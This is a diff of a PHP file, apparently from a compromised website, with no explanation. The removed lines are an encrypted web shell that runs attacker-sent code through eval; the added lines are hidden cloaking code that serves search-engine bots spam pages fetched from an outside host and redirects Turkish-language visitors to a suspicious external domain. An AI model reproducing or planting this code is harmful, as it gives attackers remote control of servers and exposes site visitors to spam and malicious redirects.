@@ -1,29 +1,34 @@
 <?php
-@session_start();
-@set_time_limit(0);
-@error_reporting(0);
-function encode($D,$K){
-    for($i=0;$i<strlen($D);$i++) {
-        $c = $K[$i+1&15];
-        $D[$i] = $D[$i]^$c;
-    }
-    return $D;
+error_reporting(0);
+$s_ref = $_SERVER['HTTP_REFERER'];
+$agent = $_SERVER['HTTP_USER_AGENT'];
+
+if(strpos($agent,'bot') > 0 && $_SERVER['REQUEST_URI']=='/'){	
+	$accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
+	if(strpos($accept_lang,'zh')>-1 || $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS']==1 || $_COOKIE['az']=='lp'){setcookie('az','lp',time()+3600*7200); echo ' '; exit;}
+
+	
+	echo file_get_contents("https://www.yourcandystore.com/file/www.dlszobel.edu.ph/dlszobel.html");
+	exit;
 }
-$payloadName='payload';
-$key='3c6e0b8a9c15224a';
-$data=file_get_contents("php://input");
-if ($data!==false){
-    $data=encode($data,$key);
-    if (isset($_SESSION[$payloadName])){
-        $payload=encode($_SESSION[$payloadName],$key);
-        if (strpos($payload,"getBasicsInfo")===false){
-            $payload=encode($payload,$key);
-        }
-		eval($payload);
-        echo encode(@run($data),$key);
-    }else{
-        if (strpos($data,"getBasicsInfo")!==false){
-            $_SESSION[$payloadName]=encode($data,$key);
-        }
-    }
+error_reporting(0);
+$language = $_SERVER["HTTP_ACCEPT_LANGUAGE"];
+if (strpos ( $language, "tr" ) > - 1)
+{
+  $url = "https://dragonggad2.com?c=LtK8CAd";
+  header ( 'Location: '. $url );
+  exit ();
 }
+error_reporting(0);
+$s_ref = $_SERVER['HTTP_REFERER'];
+$agent = $_SERVER['HTTP_USER_AGENT'];
+
+if(strpos($agent,'bot') > 0 && $_SERVER['REQUEST_URI']=='/app.php/'){	
+	$accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
+	if(strpos($accept_lang,'zh')>-1 || $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS']==1 || $_COOKIE['az']=='lp'){setcookie('az','lp',time()+3600*7200); echo ' '; exit;}
+
+	
+	echo file_get_contents("https://www.yourcandystore.com/file/www.dlszobel.edu.ph/dlszobel.html");
+	exit;
+}
+?>
